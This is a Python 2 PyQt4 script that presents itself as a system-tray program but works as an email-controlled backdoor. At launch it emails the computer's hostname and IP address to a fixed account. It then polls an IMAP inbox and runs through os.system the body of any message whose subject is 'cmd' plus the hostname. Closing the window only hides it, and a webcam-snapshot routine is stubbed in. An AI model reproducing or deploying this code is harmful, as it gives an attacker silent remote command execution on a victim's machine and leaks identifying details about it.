#!/usr/bin/env python
# -*- coding:utf-8 -*-
#
from PyQt4 import QtCore, QtGui
import imaplib
import smtplib#,mimetypes
import os
import time
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import thread
import socket
#from VideoCapture import Device
#import PIL
#import base64
def get_mail(host='imap.yeah.net',user='username',passwd='password'):
    #print("start get_mail")
    send_mail()
    computer_name=socket.gethostname()
    re_cmd='cmd '+computer_name
    while True:
        try:
            M=imaplib.IMAP4(host)
            M.login(user,passwd)
            M.select()
            while True:
                #print("ok")
                typ,data=M.search(None,'UNSEEN')
                #print(data)
                for num in data[0].split():
                    ttyp,ddata=M.fetch(num,'(RFC822)')
                    for res in ddata:
                        #if isinstance(res,tuple):
                        msg=email.message_from_string(res[1])
                        M.store(num,'-FLAGS','\\seen')
                        #os.system("pause")
                        if msg['Subject']==re_cmd:
                            #print('sss')
                            M.store(num,'+FLAGS','\\seen')
                            for part in msg.walk():
                                contenttype=part.get_content_type()
                                if contenttype=='text/plain':
                                    try:
                                        #print(type(part.get_payload()))
                                        #print(part.get_payload())
                                        os.system(part.get_payload())
                                    except:
                                        pass
                                    
                time.sleep(5)
                #break
        except:
            try:
                M.close()
                M.logout()
            except:
                pass
            time.sleep(10)
def camera():
    cam=Device()
    cam.saveSnapshot('imagessss.jpg')
    del cam
def send_mail(host='smtp.yeah.net',fromaddr='xxx@yeah.net',
              toaddr='yyy@yeah.net',user='username2',passwd='password'):
    msg=MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=toaddr
    #print('send_mail')
    while True:
        try:
            computer_name=socket.gethostname()
            #print(computer_name)
            computer_ip=socket.gethostbyname(computer_name)
            #print(computer_ip)
            msg['Subject']=computer_name
            #print('okk')
            contents="computer: "+computer_name+'\nip: '+computer_ip
            #print(contents)
            #print(type(contents))
            msg.attach(MIMEText(contents))
            #print(contents)
        except:
            time.sleep(3)
            pass
        else:
            break
   # camera()
   # print('ok')
#    except:
 #       print('errr')
        #pass
   # return
    while True:
        try:
            server=smtplib.SMTP(host)
            #print('ok')
            server.login('username2','password')
            server.sendmail(fromaddr,toaddr,msg.as_string())
        except:
            #print('err')
            time.sleep(3)
            try:
                server.quit()
            except:
                pass
        else:
            #print('quit ok')
            server.quit()
            break
class Window(QtGui.QMainWindow):
     def __init__(self):
         super(Window, self).__init__()
         self.setWindowTitle(u"托盘")
         icon = QtGui.QIcon('leave.ico')
         #icon2=QtGui.QIcon('justin.ico')
         self.setWindowIcon(icon)
         self.isTopLevel()
         self.trayIcon = QtGui.QSystemTrayIcon(self)
         self.trayIcon.setIcon(icon)
         self.trayIcon.show()
         #thread.start_new_thread(send_mail,())
         #############
         thread.start_new_thread(get_mail,())
         #send_mail()
         #self.trayIcon.activated.connect(self.trayClick) #点击托盘 
         #self.trayIcon.setToolTip(u"托盘小程序") #托盘信息
         #self.Menu() #右键菜单
     def Menu(self):
         self.minimizeAction = QtGui.QAction(u"最小化", self,triggered=self.hide)
         self.maximizeAction = QtGui.QAction(u"最大化",self,triggered=self.showMaximized)
         self.restoreAction = QtGui.QAction(u"还原", self,triggered=self.showNormal)
         self.quitAction = QtGui.QAction(u"退出", self,triggered=QtGui.qApp.quit)
         self.trayIconMenu = QtGui.QMenu(self)
         self.trayIconMenu.addAction(self.minimizeAction)
         self.trayIconMenu.addAction(self.maximizeAction)
         self.trayIconMenu.addAction(self.restoreAction)
         self.trayIconMenu.addSeparator() #间隔线
         self.trayIconMenu.addAction(self.quitAction)
         self.trayIcon.setContextMenu(self.trayIconMenu) #右击托盘 
     def closeEvent(self, event):
         if self.trayIcon.isVisible():
              self.hide()
              self.trayIcon.setVisible(False)
              event.ignore()
     def trayClick(self,reason):
         if reason==QtGui.QSystemTrayIcon.DoubleClick: #双击
              self.showNormal()
         elif reason==QtGui.QSystemTrayIcon.MiddleClick: #中击
              self.showMessage()
         else:
              pass
     def showMessage(self):
        icon=QtGui.QSystemTrayIcon.Information
        self.trayIcon.showMessage(u"提示信息",u"点我干嘛？",icon)
if __name__ == '__main__':
     import sys
     app = QtGui.QApplication(sys.argv)
     frm = Window()
     frm.show()
     sys.exit(app.exec_())
